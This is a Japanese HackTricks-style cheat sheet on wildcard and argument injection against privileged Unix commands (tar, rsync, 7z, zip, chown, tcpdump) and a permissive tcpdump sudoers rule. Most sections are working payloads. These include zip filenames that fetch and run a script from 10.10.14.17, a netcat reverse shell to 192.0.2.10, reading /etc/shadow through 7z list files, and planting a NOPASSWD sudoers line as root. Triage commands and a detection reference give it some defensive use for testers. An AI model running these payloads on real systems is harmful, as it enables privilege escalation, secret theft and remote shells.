# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard（別名 *glob*）の **argument injection** は、特権スクリプトが `tar`、`chown`、`rsync`、`zip`、`7z` などの Unix binary を、`*` のような引用符で囲まれていない wildcard とともに実行すると発生します。
> shell は binary の実行 **前** に wildcard を展開するため、作業ディレクトリ内にファイルを作成できる attacker は、`-` で始まるファイル名を作成できます。これにより、それらは **data ではなく options** として解釈され、任意の flags、さらには commands までも効果的に紛れ込ませることができます。
> このページでは、最も有用な primitives、最近の research、および 2023-2025 年の modern detections をまとめています。

## chown / chmod

`--reference` flag を悪用すると、任意のファイルの **owner/group または permission bits をコピー**できます。
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
root が後で次のようなものを実行すると:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` が injection され、*すべての* matching files が `/root/secret``file` の ownership/permissions を継承します。

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn)（combined attack）。
詳細については、classic DefenseCode paper も参照してください。

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** feature を abuse して arbitrary commands を実行します：
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
root が `tar -czf /root/backup.tgz *` などを実行すると、`shell.sh` が root として実行されます。

### bsdtar / macOS 14+

最近の macOS におけるデフォルトの `tar`（`libarchive` ベース）は *`--checkpoint`* を実装していませんが、外部 compressor を指定できる **--use-compress-program** flag により、引き続き code-execution を実現できます。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
特権スクリプトが `tar -cf backup.tar *` を実行すると、`/bin/sh` が起動されます。

---

## rsync

`rsync` では、`-e` または `--rsync-path` で始まる command-line flags によって、remote shell や remote binary を上書きできます：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
root が後で `rsync -az * backup:/srv/` を使ってディレクトリを archive すると、注入した flag によってリモート側で shell が起動します。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn)（`rsync` mode）。

---

## 7-Zip / 7z / 7za

特権スクリプトが option parsing を防ぐために wildcard の前に `--` を付けるなど、*defensively* 対策している場合でも、7-Zip format はファイル名の先頭に `@` を付けることで **file list files** をサポートします。これを symlink と組み合わせると、*任意のファイルを exfiltrate* できます：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root が次のようなものを実行すると:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip は `root.txt`（→ `/etc/shadow`）を file list として読み込もうとし、処理を中断して、**内容を stderr に出力します**。

これは `-- *` を使用しても成立します。7-Zip CLI は通常のファイル名と `@listfiles` の両方を positional input として明示的に受け付けるため、`@root.txt` のようなリテラルなファイル名も特殊なものとして扱われます。

---

## zip

アプリケーションが user-controlled filenames を `zip` に渡す場合（wildcard 経由、または `--` なしで名前を列挙する場合）、非常に実用的な primitive が 2 つ存在します。

- RCE via test hook: `-T` は “test archive” を有効にし、`-TT <cmd>` は tester を arbitrary program に置き換えます（long form: `--unzip-command <cmd>`）。`-` で始まる filenames を inject できる場合は、short-options parsing が機能するように、flags を別々の filenames に分割します：
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- `'-T -TT <cmd>'` のような単一の filename は試さないでください。short options は文字ごとに解析されるため、失敗します。示されているように、別々の tokens を使用してください。
- アプリによって filenames から slashes が削除される場合は、bare host/IP から取得します（default path は `/index.html`）。その後、`-O` でローカルに保存して実行します。
- `-sc`（processed argv を表示）または `-h2`（more help）を使って parsing を debug し、tokens がどのように消費されるかを確認できます。

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Web layer が `zip` の stdout/stderr をエコーする場合（naive wrappers では一般的）、`--help` のような injected flags や不正な options による failures が HTTP response に現れ、command-line injection を確認し、payload の調整に役立ちます。

---

## wildcard injection に脆弱な追加の binaries（2023-2025 quick list）

以下の commands は、modern CTFs や実環境で悪用されています。payload は常に、後で wildcard とともに処理される writable directory 内の *filename* として作成されます。

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | ファイルの内容を読み取る |
| `flock` | `-c <cmd>` | command を実行する |
| `git`   | `-c core.sshCommand=<cmd>` | git over SSH 経由で command execution |
| `scp`   | `-S <cmd>` | ssh の代わりに arbitrary program を spawn する |

これらの primitives は *tar/rsync/zip* の classics ほど一般的ではありませんが、hunting の際には確認する価値があります。

---

## 脆弱な wrappers と jobs の hunting

Recent case studies では、wildcard/argv injection はもはや **cron + tar** だけの問題ではないことが示されています。同じ bug class は、以下のような場所で繰り返し現れています。

- attacker-controlled upload directories から「すべてを zip/tar として download」する web features
- attacker-controlled filename/filter fields を持つ **tcpdump** wrapper を公開する vendor/appliance debug shells
- writable directories に対して `tar`、`rsync`、`7z`、`zip`、`chown`、または `chmod` を呼び出す backup または rotation jobs

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
簡易的なヒューリスティック:

- `-- *` は多くの GNU tools で有効な対策ですが、`7z`/`7za` には適用できません。`@listfiles` は別途解析されるためです。
- `zip` では、user-controlled な filenames を直接列挙する wrappers を探してください。shell glob がなくても、short-option splitting（`-T` + `-TT <cmd>`）は機能します。
- `tcpdump` では、**output file names**、**rotation settings**、または **capture-file replay** の arguments を制御できる wrappers に特に注意してください。

---

## tcpdump rotation hooks (-G/-W/-z): wrappers の argv injection による RCE

restricted shell または vendor wrapper が、user-controlled fields（例: "file name" parameter）を strict な quoting/validation なしに連結して `tcpdump` の command line を構築する場合、追加の `tcpdump` flags を smuggle できます。`-G`（time-based rotation）、`-W`（files の最大数）、`-z <cmd>`（post-rotate command）の組み合わせにより、tcpdump を実行している user（appliances では root であることが多い）として arbitrary command execution が可能になります。

前提条件:

- `tcpdump` に渡される `argv` に影響を与えられること（例: `/debug/tcpdump --filter=... --file-name=<HERE>` のような wrapper 経由）。
- wrapper が file name field 内の spaces または `-` で始まる tokens を sanitize しないこと。

Classic PoC（writable path から reverse shell script を実行します）:
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` は、最初に一致した packet の後、即座に rotate を強制します。
- `-z <cmd>` は、rotate のたびに post-rotate command を1回実行します。多くの build では `<cmd> <savefile>` が実行されます。`<cmd>` が script/interpreter の場合は、argument の処理が payload と一致することを確認してください。

No-removable-media variants:

- ファイルを書き込むための別の primitive（出力リダイレクトを許可する別の command wrapper など）がある場合は、script を既知の path に配置し、platform の semantics に応じて `-z /bin/sh /path/script.sh` または `-z /path/script.sh` を trigger します。
- 一部の vendor wrapper は attacker が制御可能な場所に rotate します。rotate 先の path（symlink/directory traversal）に影響を与えられる場合、外部 media なしで、完全に制御可能な content を実行するよう `-z` の向き先を変更できます。

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

非常に一般的な sudoers の anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
問題点
- `*` glob と permissive patterns は、最初の `-w` argument のみを制限します。`tcpdump` は複数の `-w` options を受け付け、最後のものが優先されます。
- この rule は他の options を固定していないため、`-Z`、`-r`、`-V` などが許可されます。

プリミティブ
- 2 つ目の `-w` で destination path を上書きする（最初のものは sudoers を満たすためだけに使用）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 制限されたツリーから脱出するための、最初の `-w` 内での path traversal：
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root`で出力の所有者を強制する（任意の場所にroot所有のファイルを作成）:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` によって細工した PCAP を再生し、任意の内容を書き込む（例：sudoers の行を追加する）:

<details>
<summary>正確な ASCII ペイロードを含む PCAP を作成し、root として書き込む</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` による任意ファイルの読み取り/secret leak（savefiles のリストとして解釈される）。エラー診断で行がそのまま表示され、内容が漏洩することがある：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## 参考資料

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
